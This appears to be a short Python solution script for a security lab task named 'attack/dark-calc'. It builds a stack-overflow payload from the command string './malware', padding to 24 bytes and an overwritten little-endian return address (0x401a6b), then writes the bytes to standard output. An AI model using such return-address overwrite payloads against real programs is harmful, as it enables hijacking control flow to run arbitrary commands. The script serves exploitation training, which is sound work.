#!/usr/bin/env python3
"""Task 1: build the payload for attack/dark-calc.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys

command = b"./malware"
padding = b" " * (24 - len(command))
target = (0x401a6b).to_bytes(8, byteorder="little")

payload = command + padding + target

sys.stdout.buffer.write(payload)
